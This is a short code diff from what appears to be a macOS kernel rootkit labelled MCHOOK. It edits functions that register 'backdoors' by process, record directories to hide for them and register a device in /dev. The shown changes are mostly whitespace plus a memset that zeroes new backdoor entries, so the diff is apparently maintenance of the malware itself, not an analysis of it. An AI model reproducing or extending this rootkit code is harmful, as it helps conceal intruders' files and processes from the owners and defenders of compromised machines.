@@ -1043,7 +1043,7 @@ void add_dir_to_hide(char *dirname, pid_t pid)
   for (i = 0; i < g_registered_backdoors; i++) {
     if (g_reg_backdoors[i]->p->p_pid      == pid
         && g_reg_backdoors[i]->is_active  == 1) {
-      for (z = 0; z < g_reg_backdoors[i]->path_counter; z ++) {
+      for (z = 0; z < g_reg_backdoors[i]->path_counter; z++) {
         if (strncmp(dirname, g_reg_backdoors[i]->path[z], MAX_DIRNAME_SIZE) == 0) {
 #ifdef DEBUG
           printf("[MCHOOK] Path already registered (%s)!\n", dirname);
@@ -1053,7 +1053,7 @@ void add_dir_to_hide(char *dirname, pid_t pid)
         }
       }
       
-      int pcounter = g_reg_backdoors[i]->path_counter;
+      int pcounter = g_reg_backdoors[i]->path_counter;     
       if (g_reg_backdoors[i]->path_counter < MAX_PATH_ENTRIES) {
         strncpy((char *)g_reg_backdoors[i]->path[pcounter],
                 dirname,
@@ -1106,6 +1106,8 @@ backdoor_init(char *username, proc_t p)
              sizeof(reg_backdoors_t),
              MK_MBUF,
              M_WAITOK);
+      memset(g_reg_backdoors[g_registered_backdoors], 0x0, sizeof(reg_backdoors_t));
+        
 
       _index = g_registered_backdoors;
       g_registered_backdoors++;
@@ -1821,7 +1823,7 @@ mchook_start (kmod_info_t *ki, void *d)
   printf("[MCHOOK] Registering our device\n");
   printf("[MCHOOK] Size of NSUInteger: %ld\n", sizeof(NSUInteger));
 #endif
-  
+    
   // Register our device in /dev
   major = cdevsw_add(major, &chardev);
   if (major == -1) {
